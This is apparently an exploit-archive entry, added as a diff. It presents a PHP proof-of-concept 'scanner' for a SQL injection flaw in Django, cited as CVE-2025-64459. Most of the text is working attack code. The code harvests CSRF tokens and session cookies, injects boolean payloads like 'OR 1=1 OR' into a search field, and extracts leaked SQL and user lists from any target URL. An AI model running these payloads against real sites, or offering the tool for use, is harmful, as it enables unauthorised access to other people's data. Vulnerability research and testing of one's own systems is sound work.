@@ -1,0 +1,218 @@
+=============================================================================================================================================
+| # Title     : Django 5.1.13 SQL Injection Scanner                                                                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.djangoproject.com/                                                                                              |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212430/ &	CVE-2025-64459
+
+[+] Summary : This PHP Proof‑of‑Concept is designed to detect and verify SQL Injection vulnerability in Django applications affected by CVE‑2025‑64459.The script performs the following actions:
+
+Sends both GET and POST requests to the target endpoint.
+
+Extracts CSRF tokens and cookies automatically.
+
+Injects multiple test payloads to compare against a safe baseline.
+
+Collects and parses the resulting SQL statements and returned user data.
+
+Compares baseline vs exploit responses to identify SQL injection behavior.
+
+Produces a concise analysis report indicating whether the endpoint is vulnerable.
+
+[+]  POC : 
+
+<?php
+/**
+ * by Indoushka
+ */
+
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
+
+define("DEFAULT_BASELINE", "AND");
+$DEFAULT_PAYLOADS = ["OR 1=1 OR", "AND 1=0 AND", "OR 'a'='a' OR"];
+
+/*---------------------------------------------------------
+   HTTP GET
+---------------------------------------------------------*/
+function http_get($url) {
+    $c = curl_init();
+    curl_setopt_array($c, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HEADER => true,
+    ]);
+    $r = curl_exec($c);
+    curl_close($c);
+    return $r;
+}
+
+/*---------------------------------------------------------
+   HTTP POST
+---------------------------------------------------------*/
+function http_post($url, $data, $cookies) {
+    $c = curl_init();
+    curl_setopt_array($c, [
+        CURLOPT_URL => $url,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => $data,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_COOKIE => $cookies,
+    ]);
+    $r = curl_exec($c);
+    curl_close($c);
+    return $r;
+}
+
+/*---------------------------------------------------------
+   Extract SQL + User List
+---------------------------------------------------------*/
+function extract_sql_and_users($html) {
+    $sql = null;
+    $users = [];
+
+    if (preg_match("/<pre>(.*?)<\/pre>/si", $html, $m))
+        $sql = trim($m[1]);
+
+    preg_match_all("/<li>(.*?)<\/li>/si", $html, $m2);
+    foreach ($m2[1] as $u) {
+        $u = trim(strip_tags($u));
+        if ($u !== "") $users[] = $u;
+    }
+
+    return [$sql, $users];
+}
+
+/*---------------------------------------------------------
+   Send CSRF Payload
+---------------------------------------------------------*/
+function send_payload($url, $payload, $verbose=false) {
+    if ($verbose)
+        echo "[*] Fetching CSRF...\n";
+
+    // GET
+    $resp = http_get($url);
+    if (!preg_match('/name="csrfmiddlewaretoken" value="([^"]+)/', $resp, $m))
+        die("[!] CSRF Not Found\n");
+    $csrf = $m[1];
+
+    if ($verbose)
+        echo "[i] CSRF token: " . substr($csrf, 0, 10) . "...\n";
+
+    preg_match_all('/Set-Cookie: ([^;]+)/', $resp, $cm);
+    $cookies = implode("; ", $cm[1]);
+
+    // POST
+    $post = [
+        "csrfmiddlewaretoken" => $csrf,
+        "search" => $payload
+    ];
+    $resp2 = http_post($url, $post, $cookies);
+
+    return extract_sql_and_users($resp2);
+}
+
+/*---------------------------------------------------------
+   Analysis
+---------------------------------------------------------*/
+function analyze($bSql, $bUsers, $eSql, $eUsers) {
+    echo "\n--- Analysis ---\n";
+    if ($bSql !== $eSql || $bUsers !== $eUsers) {
+        echo "[!] Possible SQL Injection Detected!\n";
+    } else {
+        echo "[-] No injection detected.\n";
+    }
+}
+
+/*---------------------------------------------------------
+   Baseline Test
+---------------------------------------------------------*/
+function run_baseline($url, $baseline, $verbose) {
+    echo "[*] Running baseline...\n";
+    return send_payload($url, $baseline, $verbose);
+}
+
+/*---------------------------------------------------------
+   Single Test
+---------------------------------------------------------*/
+function run_exploit($url, $payload, $baseline, $verbose) {
+    list($bSql, $bUsers) = $baseline;
+    echo "\n[*] Payload: {$payload}\n";
+    list($eSql, $eUsers) = send_payload($url, $payload, $verbose);
+    echo "Baseline SQL: " . ($bSql ?? "None") . "\n";
+    echo "Exploit SQL: " . ($eSql ?? "None") . "\n";
+    analyze($bSql, $bUsers, $eSql, $eUsers);
+}
+
+/*---------------------------------------------------------
+   Multi Payload Mode
+---------------------------------------------------------*/
+function run_multi($url, $baseline, $payloads, $verbose) {
+    foreach ($payloads as $p)
+        run_exploit($url, $p, $baseline, $verbose);
+}
+
+/*---------------------------------------------------------
+   Full Check Mode
+---------------------------------------------------------*/
+function run_check($url, $baseline, $verbose) {
+    global $DEFAULT_PAYLOADS;
+    list($bSql, $bUsers) = $baseline;
+    $vuln = false;
+
+    foreach ($DEFAULT_PAYLOADS as $p) {
+        list($eSql, $eUsers) = send_payload($url, $p, $verbose);
+
+        if ($bSql !== $eSql || $bUsers !== $eUsers) {
+            echo "[+] Payload {$p} => SQL Injection Likely!\n";
+            $vuln = true;
+        }
+    }
+    echo $vuln ? "\n[+] Target VULNERABLE\n" : "\n[-] Target SAFE\n";
+}
+
+/*---------------------------------------------------------
+   MAIN
+---------------------------------------------------------*/
+if ($argc < 3) {
+    echo "Usage:
+php scanner.php baseline http://127.0.0.1:8000/
+php scanner.php exploit http://target/ \"OR 1=1 OR\"
+php scanner.php multi http://target/
+php scanner.php check http://target/
+";
+    exit;
+}
+
+$mode = strtolower($argv[1]);
+$url  = rtrim($argv[2], "/") . "/";
+$verbose = true;
+
+$baseline = run_baseline($url, DEFAULT_BASELINE, $verbose);
+
+switch ($mode) {
+    case "baseline":
+        break;
+    case "exploit":
+        run_exploit($url, $argv[3], $baseline, $verbose);
+        break;
+    case "multi":
+        global $DEFAULT_PAYLOADS;
+        run_multi($url, $baseline, $DEFAULT_PAYLOADS, $verbose);
+        break;
+    case "check":
+        run_check($url, $baseline, $verbose);
+        break;
+    default:
+        echo "Mode Error!\n";
+}
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
